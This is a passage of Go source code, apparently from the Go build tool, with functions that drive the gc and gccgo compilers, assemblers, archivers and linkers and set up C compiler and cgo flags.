{\n\t\tgcargs[1] = \"main\"\n\t}\n\tif p.Standard && (p.ImportPath == \"runtime\" || strings.HasPrefix(p.ImportPath, \"runtime/internal\")) {\n\t\t// runtime compiles with a special gc flag to emit\n\t\t// additional reflect type data.\n\t\tgcargs = append(gcargs, \"-+\")\n\t}\n\n\t// If we're giving the compiler the entire package (no C etc files), tell it that,\n\t// so that it can give good error messages about forward declarations.\n\t// Exceptions: a few standard packages have forward declarations for\n\t// pieces supplied behind-the-scenes by package runtime.\n\textFiles := len(p.CgoFiles) + len(p.CFiles) + len(p.CXXFiles) + len(p.MFiles) + len(p.SFiles) + len(p.SysoFiles) + len(p.SwigFiles) + len(p.SwigCXXFiles)\n\tif p.Standard {\n\t\tswitch p.ImportPath {\n\t\tcase \"bytes\", \"net\", \"os\", \"runtime/pprof\", \"sync\", \"time\":\n\t\t\textFiles++\n\t\t}\n\t}\n\tif extFiles == 0 {\n\t\tgcargs = append(gcargs, \"-complete\")\n\t}\n\tif buildContext.InstallSuffix != \"\" {\n\t\tgcargs = append(gcargs, \"-installsuffix\", buildContext.InstallSuffix)\n\t}\n\tif p.buildID != \"\" {\n\t\tgcargs = append(gcargs, \"-buildid\", p.buildID)\n\t}\n\n\tfor _, path := range p.Imports {\n\t\tif i := strings.LastIndex(path, \"/vendor/\"); i >= 0 {\n\t\t\tgcargs = append(gcargs, \"-importmap\", path[i+len(\"/vendor/\"):]+\"=\"+path)\n\t\t} else if strings.HasPrefix(path, \"vendor/\") {\n\t\t\tgcargs = append(gcargs, \"-importmap\", path[len(\"vendor/\"):]+\"=\"+path)\n\t\t}\n\t}\n\n\t//fmt.Println(\"tool compile\")\n\t//fmt.Println(tool(\"compile\"))\n\targs := []interface{}{buildToolExec, tool(\"compile\"), \"-o\", ofile, \"-trimpath\", b.work, buildGcflags, gcargs, \"-D\", p.localPrefix, importArgs}\n\tif ofile == archive {\n\t\targs = append(args, \"-pack\")\n\t}\n\tif asmhdr {\n\t\targs = append(args, \"-asmhdr\", obj+\"go_asm.h\")\n\t}\n\tfor _, f := range gofiles {\n\t\targs = append(args, mkAbs(p.Dir, f))\n\t}\n\n\t//fmt.Println(\"compile args\")\n\t//fmt.Println(args)\n\toutput, err = b.runOut(p.Dir, p.ImportPath, nil, args...)\n\treturn ofile, output, err\n}\n\nfunc (gcToolchain) asm(b *builder, p *Package, obj, ofile, sfile string) error {\n\t// Add -I pkg/GOOS_GOARCH so #include \"textflag.h\" works in .s files.\n\tinc := filepath.Join(goroot, \"pkg\", \"include\")\n\tsfile = mkAbs(p.Dir, sfile)\n\targs := []interface{}{buildToolExec, tool(\"asm\"), \"-o\", ofile, \"-trimpath\", b.work, \"-I\", obj, \"-I\", inc, \"-D\", \"GOOS_\" + goos, \"-D\", \"GOARCH_\" + goarch, buildAsmflags, sfile}\n\tif err := b.run(p.Dir, p.ImportPath, nil, args...); err != nil {\n\t\treturn err\n\t}\n\treturn nil\n}\n\n// toolVerify checks that the command line args writes the same output file\n// if run using newTool instead.\n// Unused now but kept around for future use.\nfunc toolVerify(b *builder, p *Package, newTool string, ofile string, args []interface{}) error {\n\tnewArgs := make([]interface{}, len(args))\n\tcopy(newArgs, args)\n\tnewArgs[1] = tool(newTool)\n\tnewArgs[3] = ofile + \".new\" // x.6 becomes x.6.new\n\tif err := b.run(p.Dir, p.ImportPath, nil, newArgs...); err != nil {\n\t\treturn err\n\t}\n\tdata1, err := ioutil.ReadFile(ofile)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdata2, err := ioutil.ReadFile(ofile + \".new\")\n\tif err != nil {\n\t\treturn err\n\t}\n\tif !bytes.Equal(data1, data2) {\n\t\treturn fmt.Errorf(\"%%s and %%s produced different output files:\\n%%s\\n%%s\", filepath.Base(args[1].(string)), newTool, strings.Join(stringList(args...), \" \"), strings.Join(stringList(newArgs...), \" \"))\n\t}\n\tos.Remove(ofile + \".new\")\n\treturn nil\n}\n\nfunc (gcToolchain) pkgpath(basedir string, p *Package) string {\n\tend := filepath.FromSlash(p.ImportPath + \".a\")\n\treturn filepath.Join(basedir, end)\n}\n\nfunc (gcToolchain) pack(b *builder, p *Package, objDir, afile string, ofiles []string) error {\n\tvar absOfiles []string\n\tfor _, f := range ofiles {\n\t\tabsOfiles = append(absOfiles, mkAbs(objDir, f))\n\t}\n\tcmd := \"c\"\n\tabsAfile := mkAbs(objDir, afile)\n\tappending := false\n\tif _, err := os.Stat(absAfile); err == nil {\n\t\tappending = true\n\t\tcmd = \"r\"\n\t}\n\n\tcmdline := stringList(\"pack\", cmd, absAfile, absOfiles)\n\n\tif appending {\n\t\tif buildN || buildX {\n\t\t\tb.showcmd(p.Dir, \"%%s # internal\", joinUnambiguously(cmdline))\n\t\t}\n\t\tif buildN {\n\t\t\treturn nil\n\t\t}\n\t\tif err := packInternal(b, absAfile, absOfiles); err != nil {\n\t\t\tb.showOutput(p.Dir, p.ImportPath, err.Error()+\"\\n\")\n\t\t\treturn errPrintedOutput\n\t\t}\n\t\treturn nil\n\t}\n\n\t// Need actual pack.\n\tcmdline[0] = tool(\"pack\")\n\treturn b.run(p.Dir, p.ImportPath, nil, buildToolExec, cmdline)\n}\n\nfunc packInternal(b *builder, afile string, ofiles []string) error {\n\tdst, err := os.OpenFile(afile, os.O_WRONLY|os.O_APPEND, 0)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer dst.Close() // only for error returns or panics\n\tw := bufio.NewWriter(dst)\n\n\tfor _, ofile := range ofiles {\n\t\tsrc, err := os.Open(ofile)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\tfi, err := src.Stat()\n\t\tif err != nil {\n\t\t\tsrc.Close()\n\t\t\treturn err\n\t\t}\n\t\t// Note: Not using %%-16.16s format because we care\n\t\t// about bytes, not runes.\n\t\tname := fi.Name()\n\t\tif len(name) > 16 {\n\t\t\tname = name[:16]\n\t\t} else {\n\t\t\tname += strings.Repeat(\" \", 16-len(name))\n\t\t}\n\t\tsize := fi.Size()\n\t\tfmt.Fprintf(w, \"%%s%%-12d%%-6d%%-6d%%-8o%%-10d`\\n\",\n\t\t\tname, 0, 0, 0, 0644, size)\n\t\tn, err := io.Copy(w, src)\n\t\tsrc.Close()\n\t\tif err == nil && n < size {\n\t\t\terr = io.ErrUnexpectedEOF\n\t\t} else if err == nil && n > size {\n\t\t\terr = fmt.Errorf(\"file larger than size reported by stat\")\n\t\t}\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"copying %%s to %%s: %%v\", ofile, afile, err)\n\t\t}\n\t\tif size&1 != 0 {\n\t\t\tw.WriteByte(0)\n\t\t}\n\t}\n\n\tif err := w.Flush(); err != nil {\n\t\treturn err\n\t}\n\treturn dst.Close()\n}\n\n// setextld sets the appropriate linker flags for the specified compiler.\nfunc setextld(ldflags []string, compiler []string) []string {\n\tfor _, f := range ldflags {\n\t\tif f == \"-extld\" || strings.HasPrefix(f, \"-extld=\") {\n\t\t\t// don't override -extld if supplied\n\t\t\treturn ldflags\n\t\t}\n\t}\n\tldflags = append(ldflags, \"-extld=\"+compiler[0])\n\tif len(compiler) > 1 {\n\t\textldflags := false\n\t\tadd := strings.Join(compiler[1:], \" \")\n\t\tfor i, f := range ldflags {\n\t\t\tif f == \"-extldflags\" && i+1 < len(ldflags) {\n\t\t\t\tldflags[i+1] = add + \" \" + ldflags[i+1]\n\t\t\t\textldflags = true\n\t\t\t\tbreak\n\t\t\t} else if strings.HasPrefix(f, \"-extldflags=\") {\n\t\t\t\tldflags[i] = \"-extldflags=\" + add + \" \" + ldflags[i][len(\"-extldflags=\"):]\n\t\t\t\textldflags = true\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\tif !extldflags {\n\t\t\tldflags = append(ldflags, \"-extldflags=\"+add)\n\t\t}\n\t}\n\treturn ldflags\n}\n\nfunc (gcToolchain) ld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error {\n\timportArgs := b.includeArgs(\"-L\", allactions)\n\tcxx := len(root.p.CXXFiles) > 0 || len(root.p.SwigCXXFiles) > 0\n\tfor _, a := range allactions {\n\t\tif a.p != nil && (len(a.p.CXXFiles) > 0 || len(a.p.SwigCXXFiles) > 0) {\n\t\t\tcxx = true\n\t\t}\n\t}\n\tvar ldflags []string\n\tif buildContext.InstallSuffix != \"\" {\n\t\tldflags = append(ldflags, \"-installsuffix\", buildContext.InstallSuffix)\n\t}\n\tif root.p.omitDWARF {\n\t\tldflags = append(ldflags, \"-w\")\n\t}\n\n\t// If the user has not specified the -extld option, then specify the\n\t// appropriate linker. In case of C++ code, use the compiler named\n\t// by the CXX environment variable or defaultCXX if CXX is not set.\n\t// Else, use the CC environment variable and defaultCC as fallback.\n\tvar compiler []string\n\tif cxx {\n\t\tcompiler = envList(\"CXX\", defaultCXX)\n\t} else {\n\t\tcompiler = envList(\"CC\", defaultCC)\n\t}\n\tldflags = setextld(ldflags, compiler)\n\tldflags = append(ldflags, \"-buildmode=\"+ldBuildmode)\n\tif root.p.buildID != \"\" {\n\t\tldflags = append(ldflags, \"-buildid=\"+root.p.buildID)\n\t}\n\tldflags = append(ldflags, buildLdflags...)\n\n\t// On OS X when using external linking to build a shared library,\n\t// the argument passed here to -o ends up recorded in the final\n\t// shared library in the LC_ID_DYLIB load command.\n\t// To avoid putting the temporary output directory name there\n\t// (and making the resulting shared library useless),\n\t// run the link in the output directory so that -o can name\n\t// just the final path element.\n\tdir := \".\"\n\tif goos == \"darwin\" && buildBuildmode == \"c-shared\" {\n\t\tdir, out = filepath.Split(out)\n\t}\n\n\treturn b.run(dir, root.p.ImportPath, nil, buildToolExec, tool(\"link\"), \"-o\", out, importArgs, ldflags, mainpkg)\n}\n\nfunc (gcToolchain) ldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error {\n\timportArgs := b.includeArgs(\"-L\", allactions)\n\tldflags := []string{\"-installsuffix\", buildContext.InstallSuffix}\n\tldflags = append(ldflags, \"-buildmode=shared\")\n\tldflags = append(ldflags, buildLdflags...)\n\tcxx := false\n\tfor _, a := range allactions {\n\t\tif a.p != nil && (len(a.p.CXXFiles) > 0 || len(a.p.SwigCXXFiles) > 0) {\n\t\t\tcxx = true\n\t\t}\n\t}\n\t// If the user has not specified the -extld option, then specify the\n\t// appropriate linker. In case of C++ code, use the compiler named\n\t// by the CXX environment variable or defaultCXX if CXX is not set.\n\t// Else, use the CC environment variable and defaultCC as fallback.\n\tvar compiler []string\n\tif cxx {\n\t\tcompiler = envList(\"CXX\", defaultCXX)\n\t} else {\n\t\tcompiler = envList(\"CC\", defaultCC)\n\t}\n\tldflags = setextld(ldflags, compiler)\n\tfor _, d := range toplevelactions {\n\t\tif !strings.HasSuffix(d.target, \".a\") { // omit unsafe etc and actions for other shared libraries\n\t\t\tcontinue\n\t\t}\n\t\tldflags = append(ldflags, d.p.ImportPath+\"=\"+d.target)\n\t}\n\treturn b.run(\".\", out, nil, buildToolExec, tool(\"link\"), \"-o\", out, importArgs, ldflags)\n}\n\nfunc (gcToolchain) cc(b *builder, p *Package, objdir, ofile, cfile string) error {\n\treturn fmt.Errorf(\"%%s: C source files not supported without cgo\", mkAbs(p.Dir, cfile))\n}\n\n// The Gccgo toolchain.\ntype gccgoToolchain struct{}\n\nvar gccgoName, gccgoBin string\n\nfunc init() {\n\tgccgoName = os.Getenv(\"GCCGO\")\n\tif gccgoName == \"\" {\n\t\tgccgoName = \"gccgo\"\n\t}\n\tgccgoBin, _ = exec.LookPath(gccgoName)\n}\n\nfunc (gccgoToolchain) compiler() string {\n\treturn gccgoBin\n}\n\nfunc (gccgoToolchain) linker() string {\n\treturn gccgoBin\n}\n\nfunc (tools gccgoToolchain) gc(b *builder, p *Package, archive, obj string, asmhdr bool, importArgs []string, gofiles []string) (ofile string, output []byte, err error) {\n\tout := \"_go_.o\"\n\tofile = obj + out\n\tgcargs := []string{\"-g\"}\n\tgcargs = append(gcargs, b.gccArchArgs()...)\n\tif pkgpath := gccgoPkgpath(p); pkgpath != \"\" {\n\t\tgcargs = append(gcargs, \"-fgo-pkgpath=\"+pkgpath)\n\t}\n\tif p.localPrefix != \"\" {\n\t\tgcargs = append(gcargs, \"-fgo-relative-import-path=\"+p.localPrefix)\n\t}\n\targs := stringList(tools.compiler(), importArgs, \"-c\", gcargs, \"-o\", ofile, buildGccgoflags)\n\tfor _, f := range gofiles {\n\t\targs = append(args, mkAbs(p.Dir, f))\n\t}\n\n\toutput, err = b.runOut(p.Dir, p.ImportPath, nil, args)\n\treturn ofile, output, err\n}\n\nfunc (tools gccgoToolchain) asm(b *builder, p *Package, obj, ofile, sfile string) error {\n\tsfile = mkAbs(p.Dir, sfile)\n\tdefs := []string{\"-D\", \"GOOS_\" + goos, \"-D\", \"GOARCH_\" + goarch}\n\tif pkgpath := gccgoCleanPkgpath(p); pkgpath != \"\" {\n\t\tdefs = append(defs, `-D`, `GOPKGPATH=\"`+pkgpath+`\"`)\n\t}\n\tdefs = tools.maybePIC(defs)\n\tdefs = append(defs, b.gccArchArgs()...)\n\treturn b.run(p.Dir, p.ImportPath, nil, tools.compiler(), \"-I\", obj, \"-o\", ofile, defs, sfile)\n}\n\nfunc (gccgoToolchain) pkgpath(basedir string, p *Package) string {\n\tend := filepath.FromSlash(p.ImportPath + \".a\")\n\tafile := filepath.Join(basedir, end)\n\t// add \"lib\" to the final element\n\treturn filepath.Join(filepath.Dir(afile), \"lib\"+filepath.Base(afile))\n}\n\nfunc (gccgoToolchain) pack(b *builder, p *Package, objDir, afile string, ofiles []string) error {\n\tvar absOfiles []string\n\tfor _, f := range ofiles {\n\t\tabsOfiles = append(absOfiles, mkAbs(objDir, f))\n\t}\n\treturn b.run(p.Dir, p.ImportPath, nil, \"ar\", \"rc\", mkAbs(objDir, afile), absOfiles)\n}\n\nfunc (tools gccgoToolchain) ld(b *builder, root *action, out string, allactions []*action, mainpkg string, ofiles []string) error {\n\t// gccgo needs explicit linking with all package dependencies,\n\t// and all LDFLAGS from cgo dependencies.\n\tapackagesSeen := make(map[*Package]bool)\n\tafiles := []string{}\n\tshlibs := []string{}\n\txfiles := []string{}\n\tldflags := b.gccArchArgs()\n\tcgoldflags := []string{}\n\tusesCgo := false\n\tcxx := len(root.p.CXXFiles) > 0 || len(root.p.SwigCXXFiles) > 0\n\tobjc := len(root.p.MFiles) > 0\n\n\tactionsSeen := make(map[*action]bool)\n\t// Make a pre-order depth-first traversal of the action graph, taking note of\n\t// whether a shared library action has been seen on the way to an action (the\n\t// construction of the graph means that if any path to a node passes through\n\t// a shared library action, they all do).\n\tvar walk func(a *action, seenShlib bool)\n\twalk = func(a *action, seenShlib bool) {\n\t\tif actionsSeen[a] {\n\t\t\treturn\n\t\t}\n\t\tactionsSeen[a] = true\n\t\tif a.p != nil && !seenShlib {\n\t\t\tif a.p.Standard {\n\t\t\t\treturn\n\t\t\t}\n\t\t\t// We record the target of the first time we see a .a file\n\t\t\t// for a package to make sure that we prefer the 'install'\n\t\t\t// rather than the 'build' location (which may not exist any\n\t\t\t// more). We still need to traverse the dependencies of the\n\t\t\t// build action though so saying\n\t\t\t// if apackagesSeen[a.p] { return }\n\t\t\t// doesn't work.\n\t\t\tif !apackagesSeen[a.p] {\n\t\t\t\tapackagesSeen[a.p] = true\n\t\t\t\tif a.p.fake && a.p.external {\n\t\t\t\t\t// external _tests, if present must come before\n\t\t\t\t\t// internal _tests. Store these on a separate list\n\t\t\t\t\t// and place them at the head after this loop.\n\t\t\t\t\txfiles = append(xfiles, a.target)\n\t\t\t\t} else if a.p.fake {\n\t\t\t\t\t// move _test files to the top of the link order\n\t\t\t\t\tafiles = append([]string{a.target}, afiles...)\n\t\t\t\t} else {\n\t\t\t\t\tafiles = append(afiles, a.target)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif strings.HasSuffix(a.target, \".so\") {\n\t\t\tshlibs = append(shlibs, a.target)\n\t\t\tseenShlib = true\n\t\t}\n\t\tfor _, a1 := range a.deps {\n\t\t\twalk(a1, seenShlib)\n\t\t}\n\t}\n\tfor _, a1 := range root.deps {\n\t\twalk(a1, false)\n\t}\n\tafiles = append(xfiles, afiles...)\n\n\tfor _, a := range allactions {\n\t\t// Gather CgoLDFLAGS, but not from standard packages.\n\t\t// The go tool can dig up runtime/cgo from GOROOT and\n\t\t// think that it should use its CgoLDFLAGS, but gccgo\n\t\t// doesn't use runtime/cgo.\n\t\tif a.p == nil {\n\t\t\tcontinue\n\t\t}\n\t\tif !a.p.Standard {\n\t\t\tcgoldflags = append(cgoldflags, a.p.CgoLDFLAGS...)\n\t\t}\n\t\tif len(a.p.CgoFiles) > 0 {\n\t\t\tusesCgo = true\n\t\t}\n\t\tif a.p.usesSwig() {\n\t\t\tusesCgo = true\n\t\t}\n\t\tif len(a.p.CXXFiles) > 0 || len(a.p.SwigCXXFiles) > 0 {\n\t\t\tcxx = true\n\t\t}\n\t\tif len(a.p.MFiles) > 0 {\n\t\t\tobjc = true\n\t\t}\n\t}\n\n\tldflags = append(ldflags, \"-Wl,--whole-archive\")\n\tldflags = append(ldflags, afiles...)\n\tldflags = append(ldflags, \"-Wl,--no-whole-archive\")\n\n\tldflags = append(ldflags, cgoldflags...)\n\tldflags = append(ldflags, envList(\"CGO_LDFLAGS\", \"\")...)\n\tldflags = append(ldflags, root.p.CgoLDFLAGS...)\n\n\tldflags = stringList(\"-Wl,-(\", ldflags, \"-Wl,-)\")\n\n\tfor _, shlib := range shlibs {\n\t\tldflags = append(\n\t\t\tldflags,\n\t\t\t\"-L\"+filepath.Dir(shlib),\n\t\t\t\"-Wl,-rpath=\"+filepath.Dir(shlib),\n\t\t\t\"-l\"+strings.TrimSuffix(\n\t\t\t\tstrings.TrimPrefix(filepath.Base(shlib), \"lib\"),\n\t\t\t\t\".so\"))\n\t}\n\n\tvar realOut string\n\tswitch ldBuildmode {\n\tcase \"exe\":\n\t\tif usesCgo && goos == \"linux\" {\n\t\t\tldflags = append(ldflags, \"-Wl,-E\")\n\t\t}\n\n\tcase \"c-archive\":\n\t\t// Link the Go files into a single .o, and also link\n\t\t// in -lgolibbegin.\n\t\t//\n\t\t// We need to use --whole-archive with -lgolibbegin\n\t\t// because it doesn't define any symbols that will\n\t\t// cause the contents to be pulled in; it's just\n\t\t// initialization code.\n\t\t//\n\t\t// The user remains responsible for linking against\n\t\t// -lgo -lpthread -lm in the final link.  We can't use\n\t\t// -r to pick them up because we can't combine\n\t\t// split-stack and non-split-stack code in a single -r\n\t\t// link, and libgo picks up non-split-stack code from\n\t\t// libffi.\n\t\tldflags = append(ldflags, \"-Wl,-r\", \"-nostdlib\", \"-Wl,--whole-archive\", \"-lgolibbegin\", \"-Wl,--no-whole-archive\")\n\n\t\t// We are creating an object file, so we don't want a build ID.\n\t\tldflags = b.disableBuildID(ldflags)\n\n\t\trealOut = out\n\t\tout = out + \".o\"\n\n\tcase \"c-shared\":\n\t\tldflags = append(ldflags, \"-shared\", \"-nostdlib\", \"-Wl,--whole-archive\", \"-lgolibbegin\", \"-Wl,--no-whole-archive\", \"-lgo\", \"-lgcc_s\", \"-lgcc\")\n\n\tdefault:\n\t\tfatalf(\"-buildmode=%%s not supported for gccgo\", ldBuildmode)\n\t}\n\n\tswitch ldBuildmode {\n\tcase \"exe\", \"c-shared\":\n\t\tif cxx {\n\t\t\tldflags = append(ldflags, \"-lstdc++\")\n\t\t}\n\t\tif objc {\n\t\t\tldflags = append(ldflags, \"-lobjc\")\n\t\t}\n\t}\n\n\tif err := b.run(\".\", root.p.ImportPath, nil, tools.linker(), \"-o\", out, ofiles, ldflags, buildGccgoflags); err != nil {\n\t\treturn err\n\t}\n\n\tswitch ldBuildmode {\n\tcase \"c-archive\":\n\t\tif err := b.run(\".\", root.p.ImportPath, nil, \"ar\", \"rc\", realOut, out); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\treturn nil\n}\n\nfunc (tools gccgoToolchain) ldShared(b *builder, toplevelactions []*action, out string, allactions []*action) error {\n\targs := []string{\"-o\", out, \"-shared\", \"-nostdlib\", \"-zdefs\", \"-Wl,--whole-archive\"}\n\tfor _, a := range toplevelactions {\n\t\targs = append(args, a.target)\n\t}\n\targs = append(args, \"-Wl,--no-whole-archive\", \"-shared\", \"-nostdlib\", \"-lgo\", \"-lgcc_s\", \"-lgcc\", \"-lc\")\n\tshlibs := []string{}\n\tfor _, a := range allactions {\n\t\tif strings.HasSuffix(a.target, \".so\") {\n\t\t\tshlibs = append(shlibs, a.target)\n\t\t}\n\t}\n\tfor _, shlib := range shlibs {\n\t\targs = append(\n\t\t\targs,\n\t\t\t\"-L\"+filepath.Dir(shlib),\n\t\t\t\"-Wl,-rpath=\"+filepath.Dir(shlib),\n\t\t\t\"-l\"+strings.TrimSuffix(\n\t\t\t\tstrings.TrimPrefix(filepath.Base(shlib), \"lib\"),\n\t\t\t\t\".so\"))\n\t}\n\treturn b.run(\".\", out, nil, tools.linker(), args, buildGccgoflags)\n}\n\nfunc (tools gccgoToolchain) cc(b *builder, p *Package, objdir, ofile, cfile string) error {\n\tinc := filepath.Join(goroot, \"pkg\", \"include\")\n\tcfile = mkAbs(p.Dir, cfile)\n\tdefs := []string{\"-D\", \"GOOS_\" + goos, \"-D\", \"GOARCH_\" + goarch}\n\tdefs = append(defs, b.gccArchArgs()...)\n\tif pkgpath := gccgoCleanPkgpath(p); pkgpath != \"\" {\n\t\tdefs = append(defs, `-D`, `GOPKGPATH=\"`+pkgpath+`\"`)\n\t}\n\tswitch goarch {\n\tcase \"386\", \"amd64\":\n\t\tdefs = append(defs, \"-fsplit-stack\")\n\t}\n\tdefs = tools.maybePIC(defs)\n\treturn b.run(p.Dir, p.ImportPath, nil, envList(\"CC\", defaultCC), \"-Wall\", \"-g\",\n\t\t\"-I\", objdir, \"-I\", inc, \"-o\", ofile, defs, \"-c\", cfile)\n}\n\n// maybePIC adds -fPIC to the list of arguments if needed.\nfunc (tools gccgoToolchain) maybePIC(args []string) []string {\n\tswitch buildBuildmode {\n\tcase \"c-shared\", \"shared\":\n\t\targs = append(args, \"-fPIC\")\n\t}\n\treturn args\n}\n\nfunc gccgoPkgpath(p *Package) string {\n\tif p.build.IsCommand() && !p.forceLibrary {\n\t\treturn \"\"\n\t}\n\treturn p.ImportPath\n}\n\nfunc gccgoCleanPkgpath(p *Package) string {\n\tclean := func(r rune) rune {\n\t\tswitch {\n\t\tcase 'A' <= r && r <= 'Z', 'a' <= r && r <= 'z',\n\t\t\t'0' <= r && r <= '9':\n\t\t\treturn r\n\t\t}\n\t\treturn '_'\n\t}\n\treturn strings.Map(clean, gccgoPkgpath(p))\n}\n\n// libgcc returns the filename for libgcc, as determined by invoking gcc with\n// the -print-libgcc-file-name option.\nfunc (b *builder) libgcc(p *Package) (string, error) {\n\tvar buf bytes.Buffer\n\n\tgccCmd := b.gccCmd(p.Dir)\n\n\tprev := b.print\n\tif buildN {\n\t\t// In -n mode we temporarily swap out the builder's\n\t\t// print function to capture the command-line. This\n\t\t// let's us assign it to $LIBGCC and produce a valid\n\t\t// buildscript for cgo packages.\n\t\tb.print = func(a ...interface{}) (int, error) {\n\t\t\treturn fmt.Fprint(&buf, a...)\n\t\t}\n\t}\n\tf, err := b.runOut(p.Dir, p.ImportPath, nil, gccCmd, \"-print-libgcc-file-name\")\n\tif err != nil {\n\t\treturn \"\", fmt.Errorf(\"gcc -print-libgcc-file-name: %%v (%%s)\", err, f)\n\t}\n\tif buildN {\n\t\ts := fmt.Sprintf(\"LIBGCC=$(%%s)\\n\", buf.Next(buf.Len()-1))\n\t\tb.print = prev\n\t\tb.print(s)\n\t\treturn \"$LIBGCC\", nil\n\t}\n\n\t// The compiler might not be able to find libgcc, and in that case,\n\t// it will simply return \"libgcc.a\", which is of no use to us.\n\tif !filepath.IsAbs(string(f)) {\n\t\treturn \"\", nil\n\t}\n\n\treturn strings.Trim(string(f), \"\\r\\n\"), nil\n}\n\n// gcc runs the gcc C compiler to create an object from a single C file.\nfunc (b *builder) gcc(p *Package, out string, flags []string, cfile string) error {\n\treturn b.ccompile(p, out, flags, cfile, b.gccCmd(p.Dir))\n}\n\n// gxx runs the g++ C++ compiler to create an object from a single C++ file.\nfunc (b *builder) gxx(p *Package, out string, flags []string, cxxfile string) error {\n\treturn b.ccompile(p, out, flags, cxxfile, b.gxxCmd(p.Dir))\n}\n\n// ccompile runs the given C or C++ compiler and creates an object from a single source file.\nfunc (b *builder) ccompile(p *Package, out string, flags []string, file string, compiler []string) error {\n\tfile = mkAbs(p.Dir, file)\n\treturn b.run(p.Dir, p.ImportPath, nil, compiler, flags, \"-o\", out, \"-c\", file)\n}\n\n// gccld runs the gcc linker to create an executable from a set of object files.\nfunc (b *builder) gccld(p *Package, out string, flags []string, obj []string) error {\n\tvar cmd []string\n\tif len(p.CXXFiles) > 0 || len(p.SwigCXXFiles) > 0 {\n\t\tcmd = b.gxxCmd(p.Dir)\n\t} else {\n\t\tcmd = b.gccCmd(p.Dir)\n\t}\n\treturn b.run(p.Dir, p.ImportPath, nil, cmd, \"-o\", out, obj, flags)\n}\n\n// gccCmd returns a gcc command line prefix\n// defaultCC is defined in zdefaultcc.go, written by cmd/dist.\nfunc (b *builder) gccCmd(objdir string) []string {\n\treturn b.ccompilerCmd(\"CC\", defaultCC, objdir)\n}\n\n// gxxCmd returns a g++ command line prefix\n// defaultCXX is defined in zdefaultcc.go, written by cmd/dist.\nfunc (b *builder) gxxCmd(objdir string) []string {\n\treturn b.ccompilerCmd(\"CXX\", defaultCXX, objdir)\n}\n\n// ccompilerCmd returns a command line prefix for the given environment\n// variable and using the default command when the variable is empty.\nfunc (b *builder) ccompilerCmd(envvar, defcmd, objdir string) []string {\n\t// NOTE: env.go's mkEnv knows that the first three\n\t// strings returned are \"gcc\", \"-I\", objdir (and cuts them off).\n\n\tcompiler := envList(envvar, defcmd)\n\ta := []string{compiler[0], \"-I\", objdir}\n\ta = append(a, compiler[1:]...)\n\n\t// Definitely want -fPIC but on Windows gcc complains\n\t// \"-fPIC ignored for target (all code is position independent)\"\n\tif goos != \"windows\" {\n\t\ta = append(a, \"-fPIC\")\n\t}\n\ta = append(a, b.gccArchArgs()...)\n\t// gcc-4.5 and beyond require explicit \"-pthread\" flag\n\t// for multithreading with pthread library.\n\tif buildContext.CgoEnabled {\n\t\tswitch goos {\n\t\tcase \"windows\":\n\t\t\ta = append(a, \"-mthreads\")\n\t\tdefault:\n\t\t\ta = append(a, \"-pthread\")\n\t\t}\n\t}\n\n\tif strings.Contains(a[0], \"clang\") {\n\t\t// disable ASCII art in clang errors, if possible\n\t\ta = append(a, \"-fno-caret-diagnostics\")\n\t\t// clang is too smart about command-line arguments\n\t\ta = append(a, \"-Qunused-arguments\")\n\t}\n\n\t// disable word wrapping in error messages\n\ta = append(a, \"-fmessage-length=0\")\n\n\t// On OS X, some of the compilers behave as if -fno-common\n\t// is always set, and the Mach-O linker in 6l/8l assumes this.\n\t// See https://golang.org/issue/3253.\n\tif goos == \"darwin\" {\n\t\ta = append(a, \"-fno-common\")\n\t}\n\n\treturn a\n}\n\n// gccArchArgs returns arguments to pass to gcc based on the architecture.\nfunc (b *builder) gccArchArgs() []string {\n\tswitch goarch {\n\tcase \"386\":\n\t\treturn []string{\"-m32\"}\n\tcase \"amd64\", \"amd64p32\":\n\t\treturn []string{\"-m64\"}\n\tcase \"arm\":\n\t\treturn []string{\"-marm\"} // not thumb\n\t}\n\treturn nil\n}\n\n// envList returns the value of the given environment variable broken\n// into fields, using the default value when the variable is empty.\nfunc envList(key, def string) []string {\n\tv := os.Getenv(key)\n\tif v == \"\" {\n\t\tv = def\n\t}\n\treturn strings.Fields(v)\n}\n\n// Return the flags to use when invoking the C or C++ compilers, or cgo.\nfunc (b *builder) cflags(p *Package, def bool) (cppflags, cflags, cxxflags, ldflags []string) {\n\tvar defaults string\n\tif def {\n\t\tdefaults = \"-g -O2\"\n\t}\n\n\tcppflags = stringList(envList(\"CGO_CPPFLAGS\", \"\"), p.CgoCPPFLAGS)\n\tcflags = stringList(envList(\"CGO_CFLAGS\", defaults), p.CgoCFLAGS)\n\tcxxflags = stringList(envList(\"CGO_CXXFLAGS\", defaults), p.CgoCXXFLAGS)\n\tldflags = stringList(envList(\"CGO_LDFLAGS\", defaults), p.CgoLDFLAGS)\n\treturn\n}\n\nvar cgoRe = regexp.MustCompile(`[/\\\\:]`)\n\nvar (\n\tcgoLibGccFile     string\n\tcgoLibGccErr      error\n\tcgoLibGccFileOnce sync.Once\n)\n\nfunc (b *builder) cgo(p *Package, cgoExe, obj string, pcCFLAGS, pcLDFLAGS, cgofiles, gccfiles, gxxfiles, mfiles []string) (outGo, outObj []string, err error) {\n\tcgoCPPFLAGS, cgoCFLAGS, cgoCXXFLAGS, cgoLDFLAGS := b.cflags(p, true)\n\t_, cgoexeCFLAGS, _, _ := b.cflags(p, false)\n\tcgoCPPFLAGS = append(cgoCPPFLAGS, pcCFLAGS...)\n\tcgoLDFLAGS = append(cgoLDFLAGS, pcLDFLAGS...)\n\t// If we are compiling Objective-C code, then we need to link against libobjc\n\tif len(mfiles) > 0 {\n\t\tcgoLDFLAGS = append(cgoLDFLAGS, \"-lobjc\")\n\t}\n\n\tif buildMSan && p.ImportPath != \"runtime/cgo\" {\n\t\tcgoCFLAGS = append([]string{\"-fsanitize=memory\"}, cgoCFLAGS...)\n\t\tcgoLDFLAGS = append([]string{\"-fsanitize=memory\"}, cgoLDFLAGS...)\n\t}\n\n\t// Allows including _cgo_export.h from .[ch] files in the package.\n\tcgoCPPFLAGS = append(cgoCPPFLAGS, \"-I\", obj)\n\n\t// cgo\n\t// TODO: CGO_FLAGS?\n\tgofiles := []string{obj + 